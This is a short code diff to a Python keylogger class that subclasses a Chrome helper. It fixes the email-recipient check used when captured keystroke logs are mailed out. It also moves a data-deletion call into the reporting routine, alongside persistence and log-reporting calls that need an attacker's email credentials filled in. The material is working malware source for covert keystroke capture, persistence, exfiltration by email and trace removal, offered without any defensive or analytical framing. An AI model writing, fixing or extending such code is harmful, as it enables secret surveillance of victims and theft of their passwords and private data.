@@ -127,7 +127,7 @@ class Keylogger(Chrome):
 			pass
 
 		if valid:
-			if email_to:
+			if self.email_to:
 				server.sendmail(self.email, self.email_to, message)
 			else:
 				server.sendmail(self.email, self.email, message)
@@ -151,6 +151,7 @@ class Keylogger(Chrome):
 
 	def report_logs(self):
 		if not check_chrome_running():
+			delete_data()
 			self.report_url_file()
 
 		self.send_email(self.tidy_log(self.log))
@@ -165,5 +166,4 @@ class Keylogger(Chrome):
 if __name__ == '__main__':
 	key = Keylogger(None, password=None, interval=None) # Replace the None values here. Email, password, interval
 	key.persistence()
-	delete_data()
 	key.report_logs()
